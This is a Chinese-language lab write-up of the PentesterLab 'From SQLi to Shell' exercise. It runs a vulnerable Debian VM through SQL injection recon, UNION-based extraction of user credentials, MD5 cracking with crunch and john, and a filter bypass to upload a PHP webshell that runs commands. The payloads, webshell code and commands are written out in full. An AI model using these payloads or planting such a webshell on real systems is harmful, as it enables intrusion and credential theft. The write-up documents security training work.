# chap0x07 从SQL注入到Shell 
## 实验环境
虚拟机：virtual box 5.2.18 r124319
 - Attaker：4.17.0-kali1-amd64
 -  victim：linux debian 2.6.32-5-686，来自[这里](https://pentesterlab.com/exercises/from_sqli_to_shell/iso)
## 实验流程
### 网络拓扑
![](img/20181102-top.png)

### 1. 指纹收集
- 使用 `netdiscover -p -r 192.168.163.0/24` 发现局域网内存活主机
    > -p passive mode: 不发送任何包，只监听，所以这种模式比较隐蔽

    ![](img/20181102-7.png)
- 使用 tenlnet 和 netcat 与靶机建立链接,并发送GET请求，从返回信息可知，靶机使用的是 Apache/2.2.16 (Debian)服务器，后端编写采用PHP/5.3.3-7+squeeze3

    ![](img/20181102-0.png)
- netcat 和 telnet 只能在HTTP协议下正常使用， 如果网站只允许使用HTTPs协议，需要用 openssl 与靶机建立连接，在该环境中HTTPs默认端口443并未开放，使用 openssl 与靶机建立连接失败

### 2. 手工检测和利用SQL注入
#### 2.1 Detection of SQL injection
在浏览器访问靶机ip地址，成功访问
 
![](img/20181102-3.png)

尝试点击页面上可点击的按钮，配合使用开发者工具查看，发现URL中id=1，id=2,id=3部分很可疑，或许是一个可利用的SQL注入点

![](img/20181102-4.png)

使用wfuzz工具对网页的目录、文件进行蛮力检测

![](img/20181102-56.png)

尝试访问 wfuzz 给出的目录，可查看样式表，未找到其他可利用信息

![](img/20181102-57.png)

检测是否存在sql注入点
- 更改数字为表达式 : `id=2-1`时出现页面与`id=1`时一致，`id=2*3-4`时出现页面与`id=2`时一致，可知通过id传入数据库的参数被作为表达式执行

    ![](img/20181102-9.png)

传入一些认为不正确的URL，查看是否有报错信息，如果靶机服务器配置中没有关闭报错，后续就能更轻松的利用报错信息做出更多的判断。
- 设置url为 `http://192.168.163.3/cat.php?id=3''`,数据库报错，得知后台数据库采用MySQL 

    ![](img/20181102-11.png)
- 设置url为 `http://192.168.163.3/cat.php?`，不给id传入参数时，页面返回了所有图片，并在错误信息中可知cat.php的路径信息

    ![](img/20181102-12.png)
    
    直接访问 `http://192.168.163.3/var/www/cat.php?id=2`，没有新信息获得

    ![](img/20181102-13.png)

- 设置url为 `http://192.168.163.3/cat.php?id=1 and 1 = 0` 使查询条件恒不成立，设置url为 `http://192.168.163.3/cat.php?id=1 or 1 = 1`使查询条件恒成立, 这样的查询带有更多的恶意，能改变原查询的语义，或许可以得到意想不到的信息，但这里并没有得到有效信息

    ![](img/20181102-14.png)

至此已经发现url中（`http://192.168.163.3/cat.php?id=1`）cat.php中传入参数id为一个可利用的SQL注入点，开始进一步利用 
#### 2.2 Exploitation of SQL injections
### 步骤
step 1. 分析当前找到的注入点（获取该查询语句的列数，在页面中能回显的是哪一列）

** UNION 关键字 **
- 用法：UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据，由于每个 SELECT 语句中的列的数目必须相同，可枚举列数根据错误信息进一步判断。
- 优点：使用了UNION拜托了原查询语句中表的束缚，可以自行查看系统表内容
- 缺点：需要注意保持两个查询语句列数一致
- 需要注意：SELECT 1，2，3，4这样测试列数的方式并不适用于所有数据库，比如在Oracle中使用 SELECT 语句必须使用 FROM 语句 

    使用下列查询url进行访问，发现只有union 后 SELECT 语句查询结果为4列时页面正常返回
    - `http://192.168.163.3/cat.php?id=2 union select 1`
    - `http://192.168.163.3/cat.php?id=2 union select 1,2`
    - `http://192.168.163.3/cat.php?id=2 union select 1,2,3`
    - `http://192.168.163.3/cat.php?id=2 union select 1,2,3,4`
    - `http://192.168.163.3/cat.php?id=2 union select 1,2,3,4,5`

    ![](img/20181102-16.png)

    select查询结果为4列时页面正常返回，并将第二列的数值在页面上进行了返回，推测该select语句应该是根据图片id查询图片名称的语句。

    ![](img/20181102-19.png)

** ORDER BY **
- 用法：ORDER BY 语句用于根据指定的列对结果集进行排序。若指定的属性列的列号大于查询表的列数，则会报错，可利用该属性进行列数判断

    同样， order by 后跟列号1，2，3，4时可正常查询 

    ![](img/20181102-22.png)

    order by 后列号为5时显示未知列号，故注入点所在查询语句列数为 4

    ![](img/20181102-26.png)
step 2. 从数据库元表检索信息（获取表名、列名等信息找出进一步可利用的表项）
    - `urrent_user()`，php连接数据库时用户
    - `version()`，数据库版本
    - `database()`，数据库名称

    ![](img/20181102-28.png)

    ![](img/20181102-29.png)

    ![](img/20181102-30.png)

step 3. 从其他表检索信息

输出所有数据库中所有表名，设置url为 `http://192.168.163.3/cat.php?id=2 UNION SELECT 1, table_name,3,4 FROM information_schema.columns`

![](img/20181102-31.png)
    
![](img/20181102-32.png)
    
使用concat，把列名和对应表名连接为一个字符串一同输出，设置url为 `http://192.168.163.3/cat.php?id=2 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columnss`
 
![](img/20181102-33.png)

发现Users表中有id，password等信息

![](img/20181102-34.png)

设置url为 `http://192.168.163.3/cat.php?id=2 UNION SELECT 1,concat(login,':',password),3,4 FROM users;`成功获取管理员用户名和对应密码的哈希值

![](img/20181102-35.png)
### 3. 获取管理员权限和代码执行
#### 3.1 密码破解
这个哈希值的计算未加盐，所以破解比较容易，有两种方式：
- google搜索，直接得出，

    ![](img/20181102-36.png)
- John-The-Ripper
    - 使用 crunch 构造字典，目测构造出的字典数据会很大，随便测试了两种输入手动生成字典
        - `crunch 6 7 123 -o dict1`

            ![](img/20181102-44.png)
        - `crunch 7 8 passwordPASSWORD40 -o dict2` 发现如果完全未知密码信息去构造生成的字典非常大
        
            ![](img/20181102-39.png)
        - `crunch 8 8 Pswrd40 -o dict2`，为了使用john进行破解，此处在已知密码情况下构造了一个相对较小的字典，大小为49M
            ![](img/20181102-41.png)
    - 使用john进行爆破
        - pswd文件中写入 `admin:8efe310f9ab3efeae8d410a8e0166eb2`，以 `:` 分隔用户名和哈希值
        - 执行 `john pswd --format=raw-md5  --wordlist=dict2 --rules`，成功破解 
        ![](img/20181102-43.png)
#### 3.2 登录
 - 输入账号密码

    ![](img/20181102-55.png)

- 成功登录后界面如下，可点击上传文件

    ![](img/20181102-45.png)

    ![](img/20181102-49.png)

#### 3.3 Webshell
- 编写内容如下的php文件，命名为 test.php
    ```php
    <?php
    system($_GET['cmd']);
    ?>
    ```
- 尝试直接上传失败

    ![](img/20181102-47.png)

- 将文件名改为 `test.php3`可成功上传，将文件名改为 `test.php.haha`可成功上传Webshell

    ![](img/20181102-48.png)

- 利用开发者工具分析上传后文件所在的目录

    ![](img/20181102-50.png)

- 设值url为 `http://192.168.163.3/admin/uploads/`，可查看服务器目录

    ![](img/20181102-52.png)

- 利用Webshell
    - 查看系统版本 `http://192.168.163.3/admin/uploads/test.php3?cmd=uname -a`

        ![](img/20181102-51.png)
    - 尝试删除文件 test.php.haha, `http://192.168.163.3/admin/uploads/test.php3?cmd=ls;del test.php.haha;echo OK!`

        ![](img/20181102-53.png)

    - 成功删除 test.php.haha, `http://192.168.163.3/admin/uploads/test.php3?cmd=ls`

        ![](img/20181102-54.png)
### 4. 其他


    


